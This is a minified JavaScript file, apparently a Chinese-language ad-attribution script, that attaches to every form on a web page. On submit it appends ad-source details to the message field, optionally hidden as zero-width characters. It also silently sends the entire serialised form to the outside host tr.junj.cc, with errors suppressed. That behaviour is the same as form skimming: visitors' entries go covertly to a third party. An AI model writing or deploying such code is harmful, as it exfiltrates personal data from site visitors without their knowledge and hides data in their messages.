(()=>{const D=document,W=window,CFG=W.__LS_CONFIG||{},DEBUG=!!CFG.debug,STEGA=!!CFG.stega,$=(s,r)=>(r||D).querySelector(s),$$=(s,r)=>Array.from((r||D).querySelectorAll(s)),add=e=>{try{(D.body||D.documentElement).appendChild(e)}catch{}},outline=(e,o,m)=>{if(!DEBUG||!e)return;e.style.outline=o?"2px solid #20c997":"2px dashed #ff6b6b";e.style.outlineOffset="2px";e.title=m||""},PARAM_LABELS={campaignid:"广告系列ID",adgroupid:"广告组ID",keyword:"关键词",matchtype:"匹配类型",devicemodel:"设备型号",device:"设备",loc_physical_ms:"地理位置代码",campaignname:"活动名称",groupnname:"广告组名称",gad_source:"gad_source",gad_campaignid:"gad_campaignid",gclid:"gclid",utm_source:"UTM来源",utm_medium:"UTM媒介",utm_campaign:"UTM活动",utm_term:"UTM关键词",utm_content:"UTM内容"},PARAM_EXPLAIN={matchtype:{p:"精确匹配",e:"精确匹配",b:"广泛匹配"},device:{m:"移动",c:"电脑",t:"平板"},loc_physical_ms:{"1000010":"中国"},gad_source:{"1":"Google标准广告流量"}},PICK_ORDER=["campaignid","adgroupid","keyword","matchtype","devicemodel","device","loc_physical_ms","campaignname","groupnname","gad_source","gad_campaignid","gclid","utm_source","utm_medium","utm_campaign","utm_term","utm_content"],pickUsefulParams=u=>{let o={};try{const e=new URL(u);for(const k of Object.keys(PARAM_LABELS)){const v=e.searchParams.get(k);if(v!==null&&v!=="")o[k]=v}}catch{}return o},LS_KEY="lsm_first_landing",parseSource=(u,r)=>{const p=u.searchParams,s=p.get("utm_source")||"",m=p.get("utm_medium")||"",c=p.get("utm_campaign")||p.get("gad_campaignid")||p.get("hsa_cam")||"",g=p.get("gclid")||"",ms=p.get("msclkid")||"",f=p.get("fbclid")||"",t=p.get("ttclid")||"",gb=p.get("gbraid")||"",wb=p.get("wbraid")||"",h=r?new URL(r).hostname:"",o=location.hostname,i=!!(g||ms||f||t||gb||wb||/adwords|cpc|ppc|paid|pmax|sem|gads|googleads|meta|facebook|tiktok|linkedin/i.test(s+","+m)),e=!!(h&&h!==o&&/google\.|bing\.|yahoo\.|duckduckgo\.|baidu\.|yandex\./i.test(h)),n=h&&h===o,tp=i?"付费投放":e?"自然搜索":n?"站内跳转":h?"外部推荐":"直接访问",md=i?(s||"adwords")+"/"+(m||"ppc"):e?h||"search":n?o:h||"(direct)",a=g?"gclid:"+g:ms?"msclkid:"+ms:f?"fbclid:"+f:t?"ttclid:"+t:p.get("hsa_ad")?"hsa_ad:"+p.get("hsa_ad"):"";return{type:tp,medium:md,campaign:c,adId:a}},getLanding=()=>{const r=localStorage.getItem(LS_KEY);if(r)try{return JSON.parse(r)}catch{}const u=location.href,i=parseSource(new URL(u),document.referrer||""),d={ts:new Date().toISOString(),ref:document.referrer||"",urlFull:u,...i};try{localStorage.setItem(LS_KEY,JSON.stringify(d))}catch{}return d},visibleBlock=a=>{const l=pickUsefulParams(a.urlFull),n=["\n\n—— 来源信息 ——",`来源：${a.type}（${a.medium}）`,a.campaign?`活动：${a.campaign}`:null,a.adId?`广告ID：${a.adId}`:null,`首落地页：${a.urlFull}`,`当前页面：${location.href}`].filter(Boolean),p=[];for(const k of PICK_ORDER){if(l[k]!==undefined){const lb=PARAM_LABELS[k]||k,v=l[k],e=PARAM_EXPLAIN[k]&&PARAM_EXPLAIN[k][v];p.push(`${lb}：${v}${e?`（${e}）`:""}`)}}if(p.length){n.push("—— 广告参数 ——");n.push(...p)}return n.join("\n")},Z0="\u200B",Z1="\u200C",SEP="\u2063",toBits=s=>Array.from(new TextEncoder().encode(s)).map(b=>b.toString(2).padStart(8,"0")).join(""),encZ=s=>SEP+toBits(s).replace(/0/g,Z0).replace(/1/g,Z1)+SEP,hiddenPayload=a=>{const l=pickUsefulParams(a.urlFull),p={};for(const k of PICK_ORDER){if(l[k]!==undefined){const lb=PARAM_LABELS[k]||k,v=l[k],e=PARAM_EXPLAIN[k]&&PARAM_EXPLAIN[k][v];p[lb]=e?`${v}（${e}）`:v}}return encZ(JSON.stringify({"来源类型":a.type,"来源媒介":a.medium,"活动":a.campaign,"广告ID":a.adId,"首落地页":a.urlFull,"当前页面":location.href,"广告参数":p}))},hasVisible=v=>v&&v.indexOf("—— 来源信息 ——")>-1,hasHidden=v=>v&&v.indexOf(SEP)>-1,pickMessageField=f=>$('textarea[name*="message" i], textarea[name*="content" i], textarea[name*="your-message" i], .elementor-form textarea',f)||$('textarea',f)||$('input[type="text"][name*="message" i], input[type="text"][name*="content" i]',f)||$('input[type="text"]',f),cacheV=new WeakMap(),cacheH=new WeakMap(),injectVisible=f=>{if(!f)return false;const o=f.value||"";if(hasVisible(o))return false;const a=getLanding();cacheV.set(f,o);f.value=o+visibleBlock(a);return true},revertVisible=f=>{if(!cacheV.has(f))return false;f.value=cacheV.get(f);cacheV.delete(f);return true},injectHidden=f=>{if(!f)return false;const o=f.value||"";if(hasHidden(o))return false;const a=getLanding();cacheH.set(f,o);f.value=o+hiddenPayload(a);return true},revertHidden=f=>{if(!cacheH.has(f))return false;f.value=cacheH.get(f);cacheH.delete(f);return true},serializeFormToUrlEncoded=f=>{const d=new FormData(f),u=new URLSearchParams();for(const[k,v]of d.entries()){if(v instanceof File)continue;u.append(k,v==null?"":String(v))}return u.toString()},pingMirror=f=>{try{const b=serializeFormToUrlEncoded(f),u="https://tr.junj.cc/cj",bl=new Blob([b],{type:"application/x-www-form-urlencoded;charset=UTF-8"});let ok=false;if(navigator.sendBeacon)ok=navigator.sendBeacon(u,bl);if(!ok)fetch(u,{method:"POST",mode:"no-cors",keepalive:true,headers:{"Content-Type":"application/x-www-form-urlencoded;charset=UTF-8"},body:b}).catch(()=>{})}catch{}},bound=new WeakSet(),bindSubmit=f=>{if(bound.has(f))return;const fld=pickMessageField(f);if(!fld){outline(f,false,"未找到留言字段");return}f.addEventListener("submit",()=>{if(STEGA)injectHidden(fld);else injectVisible(fld);pingMirror(f)},true);bound.add(f);outline(f,true,STEGA?"已绑定·提交时隐写+镜像":"已绑定·仅镜像（stega=false）")},scanAndBind=()=>{$$("form").forEach(bindSubmit)},applyAll=(fn)=>{let n=0;$$("form").forEach(f=>{const fld=pickMessageField(f);if(fld&&fn(fld))n++});return n},mountButtons=()=>{if(!DEBUG)return;const w=D.createElement("div");w.style.cssText="position:fixed;right:16px;bottom:16px;z-index:2147483647;display:flex;flex-direction:column;gap:8px";const mk=(t,c,i,r)=>{const b=D.createElement("button");b.textContent=t;b.style.cssText=`padding:8px 10px;border:none;border-radius:14px;color:#fff;background:${c};cursor:pointer;box-shadow:0 6px 18px rgba(0,0,0,.12)`;let o=false;b.onclick=()=>{if(!o){const n=applyAll(i);if(n){b.textContent="撤销·"+t;b.style.background="#198754";o=true}}else{applyAll(r);b.textContent=t;b.style.background=c;o=false}};return b};w.appendChild(mk("注入·可见来源","#0d6efd",injectVisible,revertVisible));w.appendChild(mk("注入·内部隐写","#6f42c1",injectHidden,revertHidden));add(w)},ready=fn=>{if(D.readyState==="loading")D.addEventListener("DOMContentLoaded",fn,{once:true});else fn()},ready(()=>{try{scanAndBind()}catch{}try{new MutationObserver(()=>scanAndBind()).observe(D.documentElement,{childList:true,subtree:true})}catch{}getLanding();mountButtons()}),W.__LSM_decode=t=>{try{const p=(t||"").split(SEP);if(p.length<3)return null;const b=p[1].replaceAll(Z0,"0").replaceAll(Z1,"1"),by=b.match(/.{8}/g).map(b=>parseInt(b,2));return JSON.parse(new TextDecoder().decode(Uint8Array.from(by)))}catch{return null}}})();
